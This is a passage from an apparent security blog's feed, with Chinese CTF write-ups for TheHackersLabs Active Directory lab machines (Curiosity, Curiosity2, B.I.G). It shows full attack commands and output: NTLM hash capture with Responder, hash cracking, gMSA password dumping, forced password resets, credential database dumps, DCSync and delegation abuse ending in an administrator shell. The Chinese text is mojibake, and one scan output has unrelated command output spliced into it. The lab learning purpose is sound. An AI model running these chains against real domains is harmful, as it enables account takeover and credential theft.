----                -------------         ------ ----
-a----       10/31/2024   6:23 PM           2231 Database.kdbx
```

æˆ‘ä»¬å°è¯•ä¸€ä¸‹ä½¿ç”¨`KeePass` æ¥æ‰“å¼€ï¼Œéœ€è¦å¯†ç 

![image.png](/post-images/TheHackersLabsCuriosity2/image4.png)

æ²¡æœ‰å¯†ç ï¼Œå…ˆæ”¾ç€

## æ¨ªå‘ç§»åŠ¨

### åŸŸåˆ†æ

ä¸Š `BloodHound`

ç”¨æˆ·å¾ˆå¤šï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥ç­›é€‰äº†è¿œç¨‹ç®¡ç†ç»„ï¼ˆREMOTE MANAGMENT USï¼‰çš„ç”¨æˆ·

![image.png](/post-images/TheHackersLabsCuriosity2/image5.png)

èƒ½å‘ç° `SQLSVC` èƒ½ç›´æ¥ä¿®æ”¹ `GMSA_SQL`çš„å¯†ç 

![image.png](/post-images/TheHackersLabsCuriosity2/image6.png)

ç„¶å `GMSA_SQL` è¿˜å¯ä»¥ä¿®æ”¹ `TOOLSDB` ï¼ˆä¸Šè¾¹æœ‰ä¸€ä¸ªåŒåæ•°æ®åº“ï¼Œæˆ‘ä»¬æ— æƒé™è®¿é—®ï¼‰çš„å¯†ç 

æ€»ç»“èµ·æ¥å°±æ˜¯

![image.png](/post-images/TheHackersLabsCuriosity2/image7.png)

### To Toolsdb

é¦–å…ˆè¯»å– `gMSA`çš„å¯†ç 

```bash
âœ  gMSADumper python gMSADumper.py -u sqlsvc -p '$PRING2021#' -d cons.thl  
Users or groups who can read password for GMSA_SQL$:
 > Svc_Accounts
GMSA_SQL$:::0960ee1575670e65d189eb6e685713ca
GMSA_SQL$:aes256-cts-hmac-sha1-96:ba95bac751b094ed71a42fcb7c4c1b34c5bdea75e47054744fa5b11863be0ea0
GMSA_SQL$:aes128-cts-hmac-sha1-96:e74d4f008426bf3fe930d12485d3f212
```

å†é€šè¿‡ `GMSA_SQL` ä¿®æ”¹ `TOOLSDB` çš„å¯†ç 

```bash
âœ  Curiosity2 bloodyAD -d 'cons.thl' -u 'GMSA_SQL$' -p :0960ee1575670e65d189eb6e685713ca --dc-ip 192.168.56.116 set password 'TOOLSDB' 'Password@123'
[+] Password changed successfully!
```

æµ‹è¯•å‡­æ®

```bash
âœ  Curiosity2 nxc smb cons.thl -u TOOLSDB -p 'Password@123'
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\TOOLSDB:Password@123 
```

### To Msol & KeePass - 2

æˆ‘ä»¬ç™»é™†ä¸Š`toolsdb` ï¼Œå¹¶ç”¨æ•°æ®åº“è„± `toolsdb` çš„æ•°æ®

```bash
*Evil-WinRM* PS C:\Users\toolsdb\Desktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE toolsdb;select name from sys.tables"
Changed database context to 'toolsdb'.
name
--------------------------------------------------------------------------------------------------------------------------------
users

(1 rows affected)

*Evil-WinRM* PS C:\Users\toolsdb\Desktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE toolsdb;select * from users"
Changed database context to 'toolsdb'.
id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 user_6B482050                                      433129A1!@1
          2 user_47F7501A                                      64409A1C!@1
          3 user_515A0C58                                      CAD616E3!@1
          4 user_CA843BF2                                      731C60AD!@1
          5 user_AA2B9FF8                                      8E181E5F!@1
          6 user_F6E6A108                                      47862562!@1
          7 user_8D56BAE8                                      425B6335!@1
          8 user_BA9B1295                                      E4FC1AC4!@1
          9 user_66B7DBEE                                      4EE216A3!@1
         10 user_E75B7C23                                      4CD89A92!@1

(10 rows affected)
```

ç»™äº†ä¸€ç»„å¯†ç ï¼Œæ„Ÿè§‰æ˜¯ `KeePass` æ–‡ä»¶çš„å¯†ç 

```bash
433129A1!@1
64409A1C!@1
CAD616E3!@1
731C60AD!@1
8E181E5F!@1
47862562!@1
425B6335!@1
E4FC1AC4!@1
4EE216A3!@1
4CD89A92!@1
```

æœ€åä½¿ç”¨`8E181E5F!@1`æˆåŠŸè§£å¯†

![image.png](/post-images/TheHackersLabsCuriosity2/image8.png)

å¾—åˆ°ç”¨æˆ· `MSOL` ç”¨æˆ·å¯†ç  `YRax2Ry8g2ITQ3hpRPze`

æµ‹è¯•å‡­æ®

```bash
âœ  Curiosity2 nxc smb cons.thl -u MSOL -p 'YRax2Ry8g2ITQ3hpRPze'
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\MSOL:YRax2Ry8g2ITQ3hpRPze 
```

### To Administrator

æŸ¥çœ‹æƒé™ï¼Œoiiaioiiiai

![image.png](/post-images/TheHackersLabsCuriosity2/image9.png)

æˆ‘ä»¬å¯¹åŸŸæœ‰`GetChangeAll`

ç›´æ¥`Dump`

![image.png](/post-images/TheHackersLabsCuriosity2/image10.png)

è¯»å– `user.txt` å’Œ `root.txt`

```bash
*Evil-WinRM* PS C:\Users\appolonia\Documents> cat User.flag.txt
de4xxxxxxxxxxxxxxxxxxxx

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat root.flag.txt
372xxxxxxxxxxxxxxxxxxxx
```

## æ€»ç»“

æ²¡æœ‰å¡ç‚¹ï¼Œé…£ç•…æ·‹æ¼“ï¼Œä¸€æŠŠæ¢­å“ˆ

ç°åœ¨å°±`Curiosity3`æŠŠæˆ‘å¡ä½äº†]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>AD</category>
            <category>Responder</category>
            <category>MSSQL</category>
            <category>gMSA</category>
            <category>KeePass</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Curiosity]]></title>
            <link>https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity</guid>
            <pubDate>Sat, 19 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Curiosity https://labs.thehackerslabs.com/machine/23 Recon PortScan nmap ç«¯å£æ‰«æ UDP ä¹Ÿæ‰«æ æšä¸¾æµ‹è¯• å› ä¸ºæ²¡æœ‰ Web ç«¯å£ï¼Œæˆ‘ä»¬ä» SMB æœåŠ¡å¼€å§‹æšä¸¾ æµ‹è¯•åŒ¿åè´¦æˆ· åœ¨è¿™é‡Œå°è¯•æšä¸¾äº†å¾ˆä¹…ï¼Œæ²¡ç»“æœ responder ...]]></description>
            <content:encoded><![CDATA[
# Curiosity

> https://labs.thehackerslabs.com/machine/23
> 

![image.png](/post-images/TheHackersLabsCuriosity/image.png)

## Recon

### PortScan

`nmap` ç«¯å£æ‰«æ

```bash
âœ  Curiosity nmap -sT -min-rate 10000 -p- 192.168.56.8
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:28 CST
Warning: 192.168.56.8 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.8
Host is up (0.00052s latency).
Not shown: 64857 closed tcp ports (conn-refused), 653 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49683/tcp open  unknown
49695/tcp open  unknown
49703/tcp open  unknown
49704/tcp open  unknown
MAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

`UDP` ä¹Ÿæ‰«æ

```bash
âœ  Curiosity nmap -sU -min-rate 10000 -p- 192.168.56.8                                                                                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:35 CST
Warning: 192.168.56.8 giving up on port because retransmission cap hit (10).
Nmap scan report for hackme.thl (192.168.56.8)
Host is up (0.032s latency).
Not shown: 65449 open|filtered udp ports (no-response), 81 closed udp ports (port-unreach)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
137/udp open  netbios-ns
389/udp open  ldap
MAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```bash
âœ  Curiosity nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.8
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 13:29 CST
Nmap scan report for 192.168.56.8
Host is up (0.00050s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 05:30:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-07-19T05:31:14
|_  start_date: 2025-07-19T11:20:37
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:94:ab:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.56.8
```

### æšä¸¾æµ‹è¯•

å› ä¸ºæ²¡æœ‰ `Web` ç«¯å£ï¼Œæˆ‘ä»¬ä»  `SMB` æœåŠ¡å¼€å§‹æšä¸¾

æµ‹è¯•åŒ¿åè´¦æˆ·

```bash
âœ  Curiosity smbclient -L 192.168.56.8 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

åœ¨è¿™é‡Œå°è¯•æšä¸¾äº†å¾ˆä¹…ï¼Œæ²¡ç»“æœ

### responder

æ‰“å¼€ `Wireshark` æŠ“åŒ…çœ‹çœ‹

çœ‹åˆ°`LLMNR`ï¼Œè®©æˆ‘æƒ³èµ·äº†`NTLM`ä¸­ç»§æ”»å‡»

![image.png](/post-images/TheHackersLabsCuriosity/image1.png)

æ‰“å¼€ `responder` 

```bash
responder -I eth2
```

æŠ“åˆ° `jdoe` çš„ `NET-NTLM hash`

![image.png](/post-images/TheHackersLabsCuriosity/image2.png)

ä½¿ç”¨ `hashcat` è¿›è¡Œçˆ†ç ´

```bash
hashcat -m 5600 hash /usr/share/seclists/Passwords/seasons.txt 
```

å¾—åˆ°å¯†ç `$pr1ng@`

![image.png](/post-images/TheHackersLabsCuriosity/image3.png)

æµ‹è¯•å‡­æ®

```bash
âœ  Curiosity nxc smb hackme.thl -u jdoe -p '$pr1ng@'                                                         
SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.8    445    DC               [+] hackme.thl\jdoe:$pr1ng@ 
âœ  Curiosity nxc ldap hackme.thl -u jdoe -p '$pr1ng@'
LDAP        192.168.56.8    389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)
LDAP        192.168.56.8    389    DC               [+] hackme.thl\jdoe:$pr1ng@ 
âœ  Curiosity nxc winrm hackme.thl -u jdoe -p '$pr1ng@'
WINRM       192.168.56.8    5985   DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.8    5985   DC               [+] hackme.thl\jdoe:$pr1ng@ (Pwn3d!)
```

å½“å‰ç”¨æˆ·å¯ä»¥æ‹¿åˆ° `user.txt`

```bash
*Evil-WinRM* PS C:\Users\jdoe\Desktop> cat user.txt
{bdxxxxxxxxxxxxxxxxxxxxxxx
```

## åŸŸåˆ†æ

æ”¶é›†æ•°æ®

```bash
âœ  Curiosity bloodhound-python -d 'hackme.thl' -ns 192.168.56.8 --zip -c All -dc 'DC.hackme.thl' -u jdoe -p '$pr1ng@'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hackme.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC.hackme.thl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC.hackme.thl
INFO: Found 17 users
INFO: Found 67 groups
INFO: Found 2 gpos
INFO: Found 6 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.hackme.thl
INFO: Connecting to GC LDAP server: DC.hackme.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250719140452_bloodhound.zip
```

ä¸Š `BLoodhound`

ç”¨æˆ·ç»„ä¿¡æ¯

![image.png](/post-images/TheHackersLabsCuriosity/image4.png)

`jdoe` ç”¨æˆ·ä¿¡æ¯

![image.png](/post-images/TheHackersLabsCuriosity/image5.png)

æ‹¥æœ‰å¼ºåˆ¶ä¿®æ”¹`DBA_ADM` çš„æƒé™

![image.png](/post-images/TheHackersLabsCuriosity/image6.png)

## æ¨ªå‘ç§»åŠ¨

### To DBA_ADM

é€šè¿‡ `bloodyAD` æ¥ä¿®æ”¹å…¶å¯†ç ï¼Œå¤±è´¥äº† âŒ

![image.png](/post-images/TheHackersLabsCuriosity/image7.png)

æˆ‘ä»¬è¿œç¨‹ä¸Šå»é€šè¿‡ `PowerShell` æ”¹ 

```bash
$SecPassword = ConvertTo-SecureString '$pr1ng@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HACKME\jdoe', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
. ./PowerView.ps1
Set-DomainUserPassword -Identity DBA_ADM -AccountPassword $UserPassword -Credential $Cred
```

æµ‹è¯•å‡­æ®

![image.png](/post-images/TheHackersLabsCuriosity/image8.png)

### To sqlsvc

![image.png](/post-images/TheHackersLabsCuriosity/image9.png)

```bash
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/18/2024   8:34 AM                Administrator
d-----       10/17/2024   4:53 PM                dba_adm
d-----       10/17/2024   2:56 PM                jdoe
d-----       10/17/2024   7:49 PM                MSSQL$SQLEXPRESS
d-r---        9/12/2016   1:37 PM                Public
d-----       10/18/2024   5:46 PM                sqlsvc
d-----       10/17/2024   7:49 PM                SQLTELEMETRY$SQLEXPRESS
```

`winpeas` æšä¸¾æ—¶èƒ½çœ‹åˆ°æ•°æ®åº“çš„ç®¡é“

![image.png](/post-images/TheHackersLabsCuriosity/image10.png)

æˆ‘ä»¬çš„ç”¨æˆ·åº”è¯¥æ˜¯å¯ä»¥å’Œæ•°æ®åº“è¿›è¡Œäº¤äº’çš„

```bash
*Evil-WinRM* PS C:\> sqlcmd -S "localhost\SQLEXPRESS" -Q "SELECT @@VERSION"

--------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)

(1 rows affected)
```

```bash
*Evil-WinRM* PS C:\> sqlcmd -S "localhost\SQLEXPRESS" -Q "select name FROM sys.databases"
name
-------------------------------------------------------------------------------------------
tempdb
model
msdb
CredentialsDB

(5 rows affected)
```

```bash
*Evil-WinRM* PS C:\> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE CredentialsDB;select name from  sys.tables"
Changed database context to 'CredentialsDB'.
name
--------------------------------------------------------------------------------------------------------------------------------
Credentials

(1 rows affected)
```

```bash
*Evil-WinRM* PS C:\> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE CredentialsDB;select * from Credentials"
Changed database context to 'CredentialsDB'.
ID          Username                                           Password
----------- -------------------------------------------------- ---------------------------------------------
          1 sqlsvc                                             23012244084524e51305f015727b890b

(1 rows affected)
```

è¿™æ ·å°±è¯»åˆ°äº†`sqlsvc`ç”¨æˆ·çš„å¯†ç 

åˆ°åœ¨çº¿ç½‘ç«™è¿›è¡Œç ´è§£ï¼Œå¾—åˆ°å¯†ç  `P@ssword1234!`

![image.png](/post-images/TheHackersLabsCuriosity/image11.png)

æµ‹è¯•å‡­æ®

```bash
âœ  Curiosity nxc smb hackme.thl -u sqlsvc -p 'P@ssword1234!'
SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.8    445    DC               [+] hackme.thl\sqlsvc:P@ssword1234! 
```

### To GMSA_SVC$

`SQLSVC` è´¦æˆ·å¯ä»¥è¯»å– `GMAS` å¯†ç 

![image.png](/post-images/TheHackersLabsCuriosity/image12.png)

è¯»å– `gMSA` çš„å¯†ç 

```bash
âœ  gMSADumper python gMSADumper.py -u sqlsvc -p 'P@ssword1234!' -d hackme.thl
Users or groups who can read password for GMSA_SVC$:
 > GMSA_USERS
GMSA_SVC$:::e1eef5023c307890fdbb047e6554cfd0
GMSA_SVC$:aes256-cts-hmac-sha1-96:b6ec5a8b9a8b6053167b86b1ef724f3af27c3de4286a59a6bfcb293a37740b66
GMSA_SVC$:aes128-cts-hmac-sha1-96:a6dc7233da4a2d54e340bb0131d9d921
```

### To Administrator

æˆ‘ä»¬å¯»æ‰¾è·¯å¾„ï¼Œå‘ç°`GMSA_SVC$` å¯¹ `DC` æœ‰ `AllowToAct` æƒé™

![image.png](/post-images/TheHackersLabsCuriosity/image13.png)

`AllowToAct` å°±æ˜¯ `AllowedToActOnBehalfOfOtherIdentity` ï¼Œ`GMSA_SVC` å·²æ·»åŠ åˆ° `DC.HACKME.THL` ä¸Šçš„ `msds-AllowedToActOnBehalfOfOtherIdentity` å±æ€§ä¸­

```bash
âœ  Curiosity getST.py -spn 'cifs/DC.hackme.thl' -impersonate 'administrator' 'hackme.thl/GMSA_SVC$' -hashes :e1eef5023c307890fdbb047e6554cfd0
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_DC.hackme.thl@HACKME.THL.ccache
```

```bash
âœ  Curiosity export KRB5CCNAME=administrator@cifs_DC.hackme.thl@HACKME.THL.ccache 

âœ  Curiosity psexec.py administrator@dc.hackme.thl -k -no-pass
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.hackme.thl.....
[*] Found writable share ADMIN$
[*] Uploading file vgKATdFu.exe
[*] Opening SVCManager on dc.hackme.thl.....
[*] Creating service VDYV on dc.hackme.thl.....
[*] Starting service VDYV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

è¯»å– `root.txt`

```bash
C:\Users\Administrator\Desktop> type root.txt
24axxxxxxxxxxxxxxxxxxxxxxxxx
```

## æ€»ç»“

ä¸ç®—éš¾ï¼Œé™¤äº†çˆ†ç ´çš„å­—å…¸æœ‰ç‚¹ä¸æ˜æ‰€ä»¥

æœ€åä¸€æ­¥ï¼Œç›´æ¥çœ‹ `GMSA_SVC$` çš„ `OutBound Execution`æ˜¯ç©ºçš„ï¼Œä½†è‡ªå·±å¯»æ‰¾è·¯å¾„åˆèƒ½æ‰¾åˆ°å°±æœ‰ç‚¹å¥‡æ€ª

ä¸‹é¢çš„è„šæœ¬ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥æˆªå–åˆ° `jdoe` ç”¨æˆ·çš„`NET NTLM HASH`

```bash
*Evil-WinRM* PS C:\temp> cat shareconnect.ps1

while ($true) {
    # Comando net use para reconectar el recurso compartido
    net use Z: \\SQLserver\bbdd /user:hackme\jdoe '$pr1ng@'

    # Espera de 1 minuto antes de volver a ejecutar
    Start-Sleep -Seconds 60
}
```]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>AD</category>
            <category>Responder</category>
            <category>MSSQL</category>
            <category>gMSA</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - B.I.G]]></title>
            <link>https://www.sunsetaction.top/2025/07/18/TheHackersLabsB I G</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/18/TheHackersLabsB I G</guid>
            <pubDate>Fri, 18 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[B.I.G https://labs.thehackerslabs.com/machine/6 Recon Port scan ä½¿ç”¨ nmap å¯¹ç«¯å£è¿›è¡Œæ‰«æ æšä¸¾æµ‹è¯• SMB åŒ¿åè´¦æˆ·æµ‹è¯• WEB ç›®å½•æ‰«æ HTTP æœåŠ¡ ä¸¤æ®µæ­Œè¯çš„æ¥æº I keep it music music, I eat ...]]></description>
            <content:encoded><![CDATA[
# B.I.G

> https://labs.thehackerslabs.com/machine/6
> 

![image.png](/post-images/TheHackersLabsB%20I%20G/image.png)

## Recon

### Port scan

ä½¿ç”¨ `nmap` å¯¹ç«¯å£è¿›è¡Œæ‰«æ

```bash
âœ  BIG nmap -sT -min-rate 10000 -p- 192.168.212.4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 15:47 CST
Warning: 192.168.212.4 giving up on port because retransmission cap hit (10).
Strange read error from 192.168.212.4 (104 - 'Connection reset by peer')
Nmap scan report for 192.168.212.4
Host is up (0.00037s latency).
Not shown: 64855 closed tcp ports (conn-refused), 655 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49676/tcp open  unknown
49686/tcp open  unknown
MAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
```

```bash
âœ  BIG nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.212.4
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 23:51:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Dâœ  BIG smbclient -L 192.168.212.4 -U anonymous                                 
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-07-18T23:52:36
|_  start_date: 2025-07-18T23:44:01
|_nbstat: NetBIOS name: BIG, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:fa:b6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: 15h59m55s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms 192.168.212.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.13 seconds
```

### æšä¸¾æµ‹è¯•

`SMB` åŒ¿åè´¦æˆ·æµ‹è¯•

```bash
âœ  BIG smbclient -L 192.168.212.4 -U anonymous                                 
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

## WEB

